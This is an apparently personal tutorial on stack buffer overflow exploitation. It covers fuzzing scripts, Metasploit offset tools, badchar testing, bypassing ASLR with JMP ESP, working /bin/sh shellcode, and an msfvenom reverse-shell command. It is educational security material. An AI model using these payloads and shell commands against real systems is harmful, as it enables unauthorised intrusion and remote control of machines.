Buffer Overflows
================


## Overview

Buffer Overflows are a type of binary exploitation which arise from poor programing practices && memory allocation in memory managed programing languages like C. They are an example for a 'mixing data && control' vulnrability.

## Occurance

Buffer Overflow vectors/vulnrabilities commonly arise when:

- User data is collected with an unprotected function like `gets()`
- A function or section of code within a program assumes a prameter or variable is of suitible length for the allocated memory
- A length/buffer check is bypassed 


# Theory

## Memory for Buffer Overflows

### Anatomy of the Stack

~ Note diagram assumes little-endian addressing

![Stack Diagram](images/StackDiagram.png "Stack Diagram")

### Returns && The EIP For Buffer Overflows

+ Returns in C always attempt to pop a value from the top of the stack, the ESP, read it and set the return pointer to that value
+ In a buffer overflow attack an attacker attempts to craft a payload such that the remainder of the stack from where the injetion took place is overwritten
+ This causes the payload to 'loop' back around to the 'top' (higher addresses {little-endian}) where the ESP is, in order to be written to the stack
+ Since the return pointer 'executes' the address at the top of the stack which the atacker has overwritten with their exploit payload the attacker has successfuly executed a buffer overflow exploit

## Executing a Buffer Overflow

### Objectives

#### Broad objectives:

+ Inject input into a vulnerable program such that the buffer space allocated for the input is overwritten
+ Overflow the EBP and reach the EIP by varying the injected string
+ Overwrite the EIP with the memory location of arbitary code to achieve arbitary code execution

# Tooling

## Linux

### GDB

Command line debugger for linux. Should be installed by default. Install:

`sudo apt-get install gdb`

#### Cheat Sheet

[gdb cheat sheet](https://gist.github.com/rkubik/b96c23bd8ed58333de37f2b8cd052c30)

## Windows

### Imunity Debugger

GUI based debugger for windows. Download the executable [here](https://debugger.immunityinc.com/ID_register.py).

# Locating

## Spiking

+ Spiking is the process of looking for input vectors that may facilitate a buffer oveflow attack
+ Best optimised with scripts
+ Typically done on remote targets where the binary can't be decompiled

### Using 'generic send tcp'

Generic send tcp is a spiking/fuzzing tool for remote targets.

#### Usage

`generic_send_tcp (host) (port) (spike_script.spk) (SKIPVAR) (SKIPSTR)`

`generic_send_tcp 192.168.0.100 701 login.spk 0 0`

#### Spike Script

```
//Example spike script

s_readline(); //Read standard out (after connect)
s_string("Relevant Server Command to Test "); //Send string to remote prompt
s_string_variable("Argument To Fuzz"); //Send a arbitary argument that will be used to fuzz for vulnerabilities 
```

## Fuzzing

+ Fuzzing is used to determine at which input byte size (input string length) a program crashes/segmentation faults
+ Knowing this length is important to crafting exploits for the return pointer/EIP to 'execute'

### Simple Python Remote Target Fuzzer

Simple remote server fuzzer template, useful for finding the byte size at which a remote buffer overflows:

```
import sys, socket
from time import sleep

current_buffer = "A" * 100  # Arbitary inital buffer length --> Should be adapted on a scenario basis
target_ip = '192.168.0.0'  # Place holder host/target/remote server IP address
target_port = 9999  # Place holder host/target/remote server port number


while True:

	try:

		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		sock.connect(('{target_ip}', target_port))  # Form socket connection to remote server

		sock.send(('RELEVANT SERVER COMMAND' + current_buffer))  # Add current test buffer size as an argument to fuzz desired command
		sock.close()
		sleep(1)  # Reduce load on remote server

		current_buffer = current_buffer + "A" * 100  # Index the buffer by another arbitary ammount

	except: 

		print("Fuzzing crashed at {} bytes".format(len(current_buffer)))
		sys.exit()

```

~ Note this script can also be found seperately under the `scripts/` directory


# Exploiting

## Locating Offsets

+ Locating the offset is about looking for the exact byte size (input string) which overwrites the EIP

### Using 'Pattern Create'

#### Overview:

+ Creates a string of no repeating values the length of the input bytes (`-l byte size`)
+ This string can then be injected into a program
+ With GDB, Imunity debugger or another debugger we can observe the string that has overwritten the EIP
+ This string can then be passed as an argument to another metasploit module to produce the exact byte length required to reach the EIP

#### Command:

`/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l (byte_length_of_buffer-overflow)`

#### Usage:

`/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000`

### Using 'Pattern Offset'

#### Overview:

+ Used after generating a pattern which when injected overwrites the EIP with a portion of the pattern
+ Matches the EIP pattern string in the original pattern to determine the number of bytes away from the begining
+ Yeilds a offset byte value from which a payload can be crafted for the EIP to execute

#### Command:

`/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l (byte_length_of_pattern) -q (EIP_string_pattern)`

#### Usage:

`/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 -q 386F4337`


## Overwriting the EIP

+ Overwriting the EIP involves writing specific bytes over the return pointer (EIP) which will be used to execute some action desired by the attacker 

### Checking Controll of the EIP

+ To check that the EIP can be overwritten and that the offset is correct a recognisable string can be added after the determined offset and the result observed in a debugger
+ If the EIP in the debugger holds the hex/ASCII value of the appended string then the EIP can be controlled

### Example:

+ The offset is 2003 bytes
+ Append some number of bytes equal or longer then the EIP `A * offset + "B" * 4`
+ If the EIP holds the hex/ASCII value of the appended string then the EIP can be controlled/overwritten as desired 
	+ `B = 41w` expect `EIP: 41414141` 

## Finding Bad Characters

+ Bad characters or 'badchars' are characters may be stripped or perform some predetermined function in a program
+ As a result those chars are 'bad' because they cannot be used to craft a payload (i.e generate shellcode)
+ Therfore such characters must be detected and eliminated from any payload which is crafted
+ Common badchars can be injected into the program in order to test if they will cause undesired function

### Badchars

+ Appended after the offset and EIP overwrite
+ Check the hexdump for any missing && out of place characters from the injection
+ Injected charcters missing in the debugger hexdump indicate bad characters  

#### Common Bad Chars

```

"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"

```

## Bypassing Stack Protections {Defeating ASLR}

+ In order to have the return pointer (EIP) point to arbitary attacker code, stored in the overflowed ESP, an attacker needs to be able to jump to the location where that payload starts in the ESP
+ However, it is rarely viable, or possible, to be able to hardcode the memory address in the ESP which holds the start of the payload due to stack protections and memeory variations
+ One way to bypass this is to find a module (dll, libary) that the program uses/is attatched to, whose memory location is not protected by, SafeSEH, ASLR, etc, and which contains a `JUMP ESP` assembly instruction
+ The attacker can then point the controlled EIP to the return pointer in the module which calls a `JUMP ESP OPCODE` on the attackers 'behalf' thus bypassing stack protections that stop the attacker directly jumping to the payload


### Determining OPCODES

+ Rather than calling assembly (ASM) instructions, Opcode equivalents are used (since this is how C calls ASM, well kinda...) within payloads
+ `nasm` can assist with translating ASM instructions into Opcodes 

#### Command:

`/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb`

#### Usage:

`nasm > (ASSEMBLY_INSTRUCTION)`

#### Example:

+ Find `JMP ESP` OPCODE

`nasm> jmp esp`


### Locating Helper DLLs {Imunity Debugger}

+ Sutible ddls (dynamic link libaries) can be located using a module for Imunity called mona

#### Mona Module

##### Install:

+ Installed from [here](https://github.com/corelan/mona)

##### Usage:

`!mona modules`

#### Find Moudle Return Address

`!mona find -s "\xff\xe4" -m (dll_name.dll)`

~ `\xff\xe4` is the opcode for jmp esp


### Memory Leaks From Format Strings {Defeating ASLR} 

+ If a target program contains a format string vulnrability that allows the attacker to pass a `%p` flag the attacker can leak memory addresses
+ This means that an attacker can defeat ASLR by learning the memory location (address) of the payload in the ESP 
+ An attacker can then jump directly from the EIP return pointer to the start of the payload

#### Example Leak Vulnerable Code

```
//From LiveOverflows Challenge

void CAFtest() {
    char buf[256] = {0};
    printf("\nC Application Firewall Test - please try a payload:\n");
    gets(buf);
    C_Application_Firewall(buf);
    printf(buf);
}

int main(int argc, char* argv[]) {
    while(1) {
        CAFtest();
    }

```

### Appending Return Address

+ Once a sutible return address is obtained it can be appended to the end of the offset to overwrite the EIP
+ Depedning on the architecture that the program is running on the return address may be written in two ways
+ Little-endian is the dominate addressing system

### Little-endian

Example Address: `625011af`

`offset + "\xaf\x11\x50\x62"`

### Big-endian

Example Address: `625011af`

`offset + "\x62\x50\x11\xaf"`

## Shellcode


### Shellcode Placement

+ Shellcode is typically appended to the input payload after the EIP overwrite and a NOP-Sled
+ The NOP-Sled may need to be shortended or extended on a case by case basis 

`payload = offset + EIP + sled + shellcode`


#### Sample Payload

~ From LiveOveflow (See resources)

```
# NOTE: python 2

shellcode = "\x90\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05"
RIP = struct.pack("Q", (start_buf+len(padding)+8)+10)
nop_sled = "\x90"*64


payload = padding + RIP + nop_sled + shellcode 

```

#### Alternate Placment {Work Around}

~ Note: These approaches only work where stack protections are disabled and direct write (without ASLR, ect bypass) to the stack is allowed
~ Note: The typical shellcode placment is the ideal approach and should not cause the bellow issue

+ Due to the way operations in a program alter memory it is possible for the shellcode itself to alter memory, specifically the location of the stackpointer
+ This means that the shellcode can cause the stackpointer to advance into the shellcode itself causing memory corruption in the remaining shellcode operations
+ This leads to a segfault and exploit faliure
+ There are several workarounds for this issue with one common goal, move the shellcode far enough away from the return pointer (EIP/RIP) to avoid interaction && corruption
 
~ Note: the offset and EIP length (size) must be adjusted each time to compensate for the changes

##### Shellcode -> Offset -> EIP/RIP

`payload = shellcode + offset + EIP`

##### nop-seld -> Shellcode -> Offset -> EIP/RIP

`payload = sled + shellcode + offset + EIP`

### Reverse Shells

#### Windows TCP

Command:

`msfvenom -p windows/shell_reverse_tcp LHOST= (listening_IP) LPORT= (listening_PORT) EXITFUNC=thread -f (file_type) -a (architecture) -b "(badchars)"`


Usage:

`msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.0 LPORT=9999 EXITFUNC=thread -f c -a x86 -b "\x00"`


### Bin/sh Shell {64 bit}

```
\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf
\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54
\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05

```

# Tricks/Tips

## NOP-Sleds

+ NOP-sledding is a technique used to help ensure that the exploit payload is reached in the overflowed ESP 
+ It acts as a padding between the EIP return address and the shellcode
+ NOP stands for No Operation which is a type of Opcode, `"\x90"`

#### Example Pad

```

sled = "\x90" * 32 

```

#### Payload Placment

```

payload = offset + EIP_return_addr + sled + shellcode

```

## Post Remote Payload Shell {Telnet Shell}

+ Used to catch a non-reverse shell after a local shell exploit (i.e `bin/sh`) in remote exploit scenarios

```
from telnetlib import Telnet

tn = Telnet()
tn.sock = s
tn.interact()
s.close()
```

## Breakpoints In Payload Code {Sigtrap}

+ To test if a exploit payload is working and jumping to the start of the shellcode a breakpoint or 'sigtrap' opcode can be prependded to the shellcode
+ This will cause an attatched debugger like GDB to pause at the start of the shellcode for analysis

```

"\xcc"

```

## Caveats Checklist

### Shellcode Breaking Exploit

+ Shellcode contains, `PUSH` ASM instructions
+ Solution: pad the shellcode away from the return pointer (EIP/RIP)

### Shellcode Fails

+ Badchars ?
+ Check for bad characters with script or by hand
+ Check hexdump

### Endianess

+ Is the program/architecture big-endian or little-endian ?
+ Adjust EIP/RIP address accordingly
